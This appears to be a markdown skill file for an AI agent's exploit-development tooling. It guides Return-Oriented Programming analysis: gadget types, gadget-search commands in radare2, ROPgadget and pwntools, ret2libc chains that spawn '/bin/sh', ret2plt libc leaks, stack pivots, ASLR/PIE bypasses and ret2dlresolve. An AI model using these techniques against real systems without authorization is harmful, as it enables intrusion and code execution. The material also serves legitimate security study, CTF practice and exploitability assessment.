---
name: rop-chain-analysis
description: >
  Return-Oriented Programming (ROP) chain identification, gadget analysis, and exploitation
  chain construction guidance. Use when checksec shows NX=enabled (no executable stack) and a
  memory corruption vulnerability exists, or when analyzing shellcode-free exploit payloads.
targets: [debugger, exploit_developer]
---

# ROP Chain Analysis Skill

## Gadget Taxonomy

| Type | Example | Use |
|---|---|---|
| Load | `pop rdi; ret` | Load argument into register |
| Load 2 | `pop rsi; ret` / `pop rsi; pop r15; ret` | Second argument |
| Load 3 | `pop rdx; ret` / `pop rdx; pop rbx; ret` | Third argument |
| Arithmetic | `add rax, rbx; ret` | Computation |
| Store | `mov [rdi], rax; ret` | Write memory |
| Deref | `mov rax, [rdi]; ret` | Read memory |
| Syscall | `syscall; ret` / `int 0x80; ret` | Execute syscall |
| Pivot | `xchg rsp, rax; ret` | Move stack pointer |
| Ret2plt | `jmp [got_entry]` | Call library function via PLT |

---

## Gadget Finding

### radare2
```
# All ROP gadgets
/R pop rdi; ret

# Specific pattern search
/R/ pop rdi

# All gadgets (slow on large binaries)
/R

# List gadgets from specific section
/R @ section..text
```

### ROPgadget (command-line)
```bash
ROPgadget --binary ./binary --rop --nojop --depth 5
ROPgadget --binary ./binary --string "/bin/sh"
ROPgadget --binary libc.so.6 --rop | grep "pop rdi"
```

### pwntools (Python)
```python
from pwn import *
elf = ELF('./binary')
libc = ELF('libc.so.6')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
```

---

## Ret2libc Chain (x86-64 Linux)

### Goal: call `system("/bin/sh")`

### Prerequisites
1. Control of `rip` (via stack overflow, etc.)
2. Leak of libc base address (or no ASLR)
3. `pop rdi; ret` gadget in binary or libc

### Chain Structure
```
overflow_payload:
  [padding to reach return address]
  [pop rdi; ret gadget]          # load arg1
  [address of "/bin/sh" in libc] # arg1 = "/bin/sh"
  [ret gadget]                   # stack alignment (needed for movaps on 16-byte aligned stack)
  [address of system() in libc]  # call system
```

### Finding "/bin/sh" in libc
```bash
strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
# Output: 1b75aa /bin/sh
# Address = libc_base + 0x1b75aa
```

### Stack Alignment (common issue)
Many libc functions (especially those using SSE) require RSP to be 16-byte aligned.
If `system()` crashes with SIGSEGV in `movaps`, add an extra `ret` gadget before `system()`.

---

## Ret2plt (libc leak)

Use when ASLR is enabled and no libc base address is known.

### Step 1 — Leak a GOT address
```
# Chain: call puts(got_entry_of_puts)
[pop rdi; ret]
[address of got_entry for puts]
[address of puts@plt]
[address of main]   # return here to re-exploit
```

### Step 2 — Compute libc base
```python
leaked_puts = int.from_bytes(leak_bytes, 'little')
libc_base = leaked_puts - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
```

### Step 3 — Send system() chain
Same as ret2libc chain above, with computed addresses.

---

## Stack Pivot

Use when controllable buffer is not on the stack (BOF into heap, stack is small).

### Pivot Gadgets to Search For
```
# Move rax (controlled) into rsp
xchg rsp, rax; ret

# Load rsp from memory
mov rsp, [rbp - 8]; ret

# Add offset to rsp
add rsp, 0x?; ret
```

### Fake Stack Setup
1. Allocate buffer in controllable memory (heap, BSS, known address)
2. Fill it with your ROP chain
3. Use pivot gadget to redirect RSP to that buffer address
4. Execution continues reading gadgets from fake stack

---

## ASLR / PIE Bypass Conditions

| Mitigation | Bypass Technique |
|---|---|
| ASLR only (no PIE) | Binary gadgets at fixed addresses; libc leaked via ret2plt |
| PIE only (no ASLR) | Binary base = fixed; gadgets at `base + offset` |
| ASLR + PIE | Need info leak for both binary and libc base |
| No ASLR, No PIE | All addresses static; ROPgadget output used directly |

### Info Leak Sources
- **Format string**: `printf(user_input)` → `%p %p %p` leaks stack values (incl. return addresses)
- **Arbitrary read**: any read primitive where address is attacker-controlled
- **Heap/stack printout**: printing struct containing pointer field
- **GOT overwrite + ret2plt**: leak one entry, compute rest

---

## ret2dlresolve (no libc leak needed)

For binaries with **partial RELRO** (writable GOT), when no libc address is available.

### Concept
Forge a fake `Elf_Rel` relocation entry pointing to a fake symbol (`system`) in a controlled buffer.
Trick the dynamic linker into resolving `system()` and storing it in a known location.

### When to Use
- No ASLR bypass available
- Partial RELRO (GOT is writable)
- 32-bit binaries (easier structure alignment)
- pwntools has `ret2dlresolve` automation: `rop.ret2dlresolve(elf, 'system', [next(elf.search(b'/bin/sh'))])`

---

## Confidence / Evidence Requirements

Before concluding a ROP chain is exploitable:
1. **Confirm**: `checksec` shows NX=enabled (stack not executable)
2. **Confirm**: exact gadget addresses are from the binary or a loaded library
3. **Confirm**: there is a controllable return-address overwrite (stack BOF, fake vtable, etc.)
4. **Confirm**: memory layout is determined (ASLR bypass exists, or ASLR disabled)

Every gadget address stated MUST come from an actual tool output search.
